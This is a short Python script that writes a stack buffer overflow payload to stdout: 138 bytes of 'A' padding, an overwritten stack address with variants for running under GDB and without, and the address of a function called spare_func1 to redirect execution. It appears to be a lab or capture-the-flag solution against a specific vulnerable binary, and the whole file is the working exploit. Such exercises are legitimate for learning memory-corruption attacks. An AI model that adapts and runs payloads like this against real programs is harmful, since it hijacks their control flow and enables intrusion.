#!/usr/bin/env python3

import sys


oflow = b'A' * 138 #+ b'C' * 8 + b'D' * 8

retaddr = 0x7fffffffe5f8 # GDB
#retaddr = 0x7fffffffde88 # no GDB

faddr = 0x4009ae # spare_func1

exploit = bytearray(oflow)
exploit.extend(retaddr.to_bytes(8, byteorder='little'))
exploit.extend(faddr.to_bytes(8, byteorder='little'))
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)


